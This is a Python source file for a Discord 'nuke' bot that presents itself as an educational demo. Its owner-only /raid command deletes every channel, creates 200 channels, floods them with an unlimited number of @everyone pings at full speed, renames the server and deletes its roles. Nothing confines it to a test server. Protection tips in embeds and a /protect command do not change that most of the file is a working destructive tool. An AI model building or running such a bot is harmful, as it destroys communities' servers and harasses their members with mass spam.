import discord
from discord.ext import commands
import asyncio
import os

# ========== CONFIGURATION ==========
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1088143400496279552

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

active_demo = {}

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ INFINITE SPEED Educational Demo Bot ready - {bot.user}")

@bot.tree.command(name="raid", description="[OWNER ONLY] INFINITE SPEED educational nuke")
async def raid(
    interaction: discord.Interaction,
    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️",
    ping: str = "yes",
    amount: int = 100000
):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can run this.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
    
    await interaction.response.send_message(f"⚡ **INFINITE SPEED EDUCATIONAL NUKE DEMO**\nSending {amount} messages at MAXIMUM SPEED...", ephemeral=False)
    
    ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
    msg_amount = amount  # NO LIMIT - user can put any number
    ping_text = "@everyone " if ping_enabled else ""
    
    guild = interaction.guild
    active_demo[guild.id] = True
    
    # Create log channel
    log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO")
    await log_channel.send("💀 **INFINITE SPEED EDUCATIONAL NUKE DEMO** 💀")
    
    messages_sent = 0
    
    async def spam_channel_infinite(channel, start_idx, msgs_to_send):
        nonlocal messages_sent
        try:
            # Send messages WITHOUT any delay - MAXIMUM SPEED
            for i in range(msgs_to_send):
                if not active_demo.get(guild.id):
                    break
                msg_num = start_idx + i + 1
                await channel.send(f"{ping_text}{message} [{msg_num}/{msg_amount}]")
                messages_sent += 1
        except:
            pass
    
    async def create_and_spam_infinite(channel_num):
        try:
            # Create channel
            channel = await guild.create_text_channel(f"nuked-{channel_num}")
            
            # Calculate messages for this channel
            msgs_per_channel = msg_amount // 200 + 1
            start_msg = channel_num * msgs_per_channel
            
            if start_msg < msg_amount:
                msgs_to_send = min(msgs_per_channel, msg_amount - start_msg)
                # SPAM INSTANTLY - NO SLEEP
                await spam_channel_infinite(channel, start_msg, msgs_to_send)
        except:
            pass
    
    try:
        # ========== DELETE ALL CHANNELS ==========
        await log_channel.send("📢 Deleting all channels...")
        delete_tasks = [channel.delete() for channel in guild.channels if channel != log_channel]
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        # ========== CREATE 200 CHANNELS AND SPAM AT INFINITE SPEED ==========
        await log_channel.send(f"📢 Creating 200 channels and spamming {msg_amount} messages at INFINITE SPEED...")
        
        CHANNEL_COUNT = 200
        
        # Create ALL channels and spam in parallel - MAXIMUM PARALLELISM
        channel_tasks = [create_and_spam_infinite(i) for i in range(CHANNEL_COUNT)]
        await asyncio.gather(*channel_tasks, return_exceptions=True)
        
        # ========== RENAME SERVER ==========
        await guild.edit(name="🔥 NUKED BY DEMO 🔥")
        
        # ========== DELETE ROLES ==========
        role_tasks = []
        for role in guild.roles:
            if not role.is_default() and not role.managed and role != guild.me.top_role:
                role_tasks.append(role.delete())
        if role_tasks:
            await asyncio.gather(*role_tasks, return_exceptions=True)
        
        await log_channel.send(f"✅ INFINITE SPEED COMPLETE! Created {CHANNEL_COUNT} channels and sent {messages_sent} messages!")
        
        # ========== EDUCATIONAL SUMMARY ==========
        embed = discord.Embed(
            title="💀 INFINITE SPEED EDUCATIONAL NUKE DEMO COMPLETE 💀",
            description=f"**What just happened at INFINITE SPEED:**\n\n"
                       f"🗑️ **ALL channels deleted** - Original server wiped in SECONDS\n"
                       f"⚡ **{CHANNEL_COUNT} new channels** - Created INSTANTLY\n"
                       f"⚡ **{messages_sent} spam messages** - Sent with ZERO DELAYS\n"
                       f"⚡ **Format:** `{ping_text}{message} [X/Total]`\n"
                       f"📛 **Server renamed** - To '🔥 NUKED BY DEMO 🔥'\n"
                       f"👑 **ALL roles deleted** - Admin protections removed\n"
                       f"🔔 **@everyone pings** - {'ENABLED' if ping_enabled else 'DISABLED'}\n\n"
                       f"**🚨 WHY THIS IS EXTREMELY DANGEROUS:**\n"
                       f"• Real nuke bots work THIS FAST or FASTER\n"
                       f"• They can destroy your server in UNDER 10 SECONDS\n"
                       f"• Once started, it's IMPOSSIBLE to stop manually\n"
                       f"• Your server would be COMPLETELY DESTROYED\n\n"
                       f"**🛡️ HOW TO PROTECT YOUR SERVER (DO THIS NOW):**\n"
                       f"• ✅ NEVER give Administrator to untrusted bots\n"
                       f"• ✅ Use 2FA on all administrator accounts\n"
                       f"• ✅ Set verification level to HIGHEST\n"
                       f"• ✅ Use backup bots (Xenon) to save server structure\n"
                       f"• ✅ Audit bot permissions EVERY WEEK\n"
                       f"• ✅ Create an 'emergency' role with channel creation perms\n\n"
                       f"**⚠️ This was an EDUCATIONAL DEMO on a TEST server**\n"
                       f"**Delete this server immediately to clean up.**",
            color=discord.Color.red()
        )
        await log_channel.send(embed=embed)
        
        # DM owner
        try:
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(embed=embed)
        except:
            pass
        
    except Exception as e:
        await log_channel.send(f"❌ Error: {e}")
    finally:
        active_demo[guild.id] = False

@bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop")
async def stopraid(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can stop the demo.", ephemeral=True)
    
    if interaction.guild.id in active_demo:
        active_demo[interaction.guild.id] = False
        await interaction.response.send_message("🛑 **Educational demo stopped**", ephemeral=False)
    else:
        await interaction.response.send_message("No active demo.", ephemeral=True)

@bot.tree.command(name="protect", description="How to protect your server")
async def protect(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ URGENT: How to Protect Your Server from Nuke Bots",
        description="Educational security guide - SHARE THIS WITH YOUR STAFF",
        color=discord.Color.green()
    )
    embed.add_field(name="🚨 IMMEDIATE ACTIONS", 
                    value="1. NEVER give Administrator to unknown bots\n2. Enable 2FA on ALL admin accounts\n3. Set verification level to HIGH", 
                    inline=False)
    embed.add_field(name="📋 WEEKLY CHECKS", 
                    value="1. Audit bot permissions\n2. Review server invite links\n3. Check audit logs for suspicious activity", 
                    inline=False)
    embed.add_field(name="💾 BACKUP STRATEGY", 
                    value="Use bots like Xenon to save your server structure daily\nThis allows 1-click restoration if nuked", 
                    inline=False)
    embed.add_field(name="⚡ EMERGENCY RESPONSE", 
                    value="If being nuked:\n1. Kick the bot IMMEDIATELY\n2. Use a backup to restore\n3. Revoke all invites", 
                    inline=False)
    embed.set_footer(text="Educational purposes only - Share this to protect servers!")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="commands", description="Show all commands")
async def cmd_list(interaction: discord.Interaction):
    embed = discord.Embed(
        title="⚡ INFINITE SPEED Educational Nuke Demo Bot",
        description="**WARNING: Educational purposes only - Run on TEST servers**",
        color=discord.Color.blue()
    )
    embed.add_field(name="/raid [message] [ping] [amount]", 
                    value=f"**MAXIMUM SPEED NUKE DEMONSTRATION**\n"
                          f"• Deletes ALL channels instantly\n"
                          f"• Creates 200 spam channels\n"
                          f"• Spams messages at MAXIMUM SPEED (no delays)\n"
                          f"• Format: `@everyone YOUR MESSAGE [message/total]`\n"
                          f"• Amount can be ANY NUMBER (100k, 1M, etc.)\n"
                          f"• Renames server\n"
                          f"• Deletes all roles\n\n"
                          f"**Shows why you should NEVER give Admin to untrusted bots!**", 
                    inline=False)
    embed.add_field(name="/stopraid", value="Emergency stop the demo", inline=False)
    embed.add_field(name="/protect", value="Show URGENT protection guide", inline=False)
    embed.add_field(name="/commands", value="Show this help", inline=False)
    embed.set_footer(text="⚠️ EDUCATIONAL ONLY - Run on test servers | PROTECT YOUR REAL SERVER!")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: DISCORD_TOKEN not set")
        exit(1)
    bot.run(TOKEN)
